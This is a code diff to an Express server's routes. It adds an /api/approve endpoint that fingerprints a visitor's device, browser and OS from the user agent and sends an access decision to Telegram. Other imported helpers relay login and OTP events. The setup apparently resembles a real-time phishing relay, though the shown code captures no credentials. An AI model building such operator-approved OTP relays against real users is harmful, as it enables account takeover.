@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { z } from "zod";
-import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure } from "./telegram";
+import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyApproval } from "./telegram";
 import { sendVisitorCard } from "./telegram-bot";
 import { UAParser } from "ua-parser-js";
 import { db } from "./db";
@@ -273,6 +273,50 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       console.error("Login failure notification error:", error);
+    }
+  });
+
+  // Approval endpoint
+  app.post("/api/approve", async (req, res) => {
+    try {
+      const { decision, language, userAgent } = req.body;
+      
+      // Parse User-Agent if provided
+      let device = 'Unknown';
+      let browser = 'Unknown';
+      let os = 'Unknown';
+      
+      if (userAgent) {
+        const parser = new UAParser(userAgent);
+        const result = parser.getResult();
+        
+        device = result.device.type 
+          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
+          : 'Desktop/Unknown';
+        browser = result.browser.name 
+          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
+          : 'Unknown';
+        os = result.os.name 
+          ? `${result.os.name} ${result.os.version || ''}`.trim()
+          : 'Unknown';
+      }
+      
+      // Send approval notification to Telegram
+      const notified = await notifyApproval(decision, language, device, browser, os);
+      
+      if (!notified) {
+        return res.status(500).json({ 
+          error: "Failed to send approval notification. Please try again." 
+        });
+      }
+
+      res.json({
+        success: true,
+        message: `Access ${decision}`
+      });
+    } catch (error) {
+      console.error("Approval notification error:", error);
+      res.status(500).json({ error: "Approval notification failed" });
     }
   });
 
